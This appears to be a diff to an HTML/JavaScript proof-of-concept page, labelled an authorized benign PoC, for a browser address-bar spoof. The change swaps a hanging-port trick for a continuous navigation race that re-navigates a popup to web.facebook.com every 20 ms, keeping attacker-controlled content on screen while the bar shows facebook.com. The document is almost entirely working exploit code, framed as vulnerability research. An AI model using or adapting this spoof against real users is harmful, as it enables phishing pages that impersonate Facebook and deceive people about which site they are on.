@@ -13,8 +13,9 @@
 </head>
 <body>
  <p>Authorized benign PoC — navigation-race / optimistic-URL spoof. Tap the link:</p>
- <p style="font-size:12px;color:#666">hang target (koneksi tak pernah commit → konten attacker nyangkut):</p>
- <input id="hang" value="https://m.facebook.com:8443/" style="width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0">
+ <p style="font-size:12px;color:#666">race target (URL asli yang di-nav berulang) + interval (ms):</p>
+ <input id="hang" value="https://web.facebook.com/" style="width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0">
+ <input id="ms" value="20" style="width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0">
  <a id="test" href="https://web.facebook.com/" onclick="foo();return false;">https://web.facebook.com/</a>
  <pre id="log">log:</pre>
  <p class="warn">Benign: NO credentials are read or stored. Proof = attacker page shown while bar shows facebook.com.</p>
@@ -61,11 +62,13 @@ footer{text-align:center;margin-top:40px;font-size:14px;color:#8a8d91}</style></
 <\/script></body></html>`;
  }
 
- function hangUrl(){ var v=document.getElementById('hang'); return (v&&v.value||'https://m.facebook.com:8443/').trim(); }
- var navigated=false;
+ function raceUrl(){ var v=document.getElementById('hang'); return (v&&v.value||'https://web.facebook.com/').trim(); }
+ function raceMs(){ var v=document.getElementById('ms'); return Math.max(5, parseInt((v&&v.value)||'20',10)||20); }
+ var navigated=false, racer=null;
 
  function foo(){
    navigated=false;
+   if(racer){ clearInterval(racer); racer=null; }
    document.getElementById("test").href = "#";
    w = window.open("?fake");
    if(!w){ log('popup blocked — FB/IG may block window.open'); return; }
@@ -79,12 +82,17 @@ footer{text-align:center;margin-top:40px;font-size:14px;color:#8a8d91}</style></
      if (!navigated && w.location.href.indexOf('about:blank') === -1){
        navigated = true;
        clearInterval(t);
-       var u = hangUrl();
-       log('attacker content up. navigating child to HANGING target: ' + u);
-       // never commits (filtered port) -> old attacker document stays painted,
-       // bar optimistically shows the target URL. No 5s decay.
-       w.location.href = u;
-       log('DONE. Child: bar should show facebook & attacker content should PERSIST.');
+       var u = raceUrl(), ms = raceMs();
+       log('attacker content up. CONTINUOUS nav-race -> ' + u + ' every ' + ms + 'ms');
+       // re-issue navigation faster than it can commit: each tick updates the bar to
+       // the target (optimistic) then is canceled by the next tick before the new
+       // document can paint -> attacker content never replaced, bar stays on target.
+       racer = setInterval(function(){ try{ w.location.href = u; }catch(e){} }, ms);
+       // auto-stop after 20s so it doesn't run away; spoof is "stable while race runs".
+       setTimeout(function(){
+         if(racer){ clearInterval(racer); racer=null;
+           log('race stopped (20s). If bar stayed facebook & content stayed attacker during the race = SPOOF.'); }
+       }, 20000);
      }
    }catch(e){
      clearInterval(t);
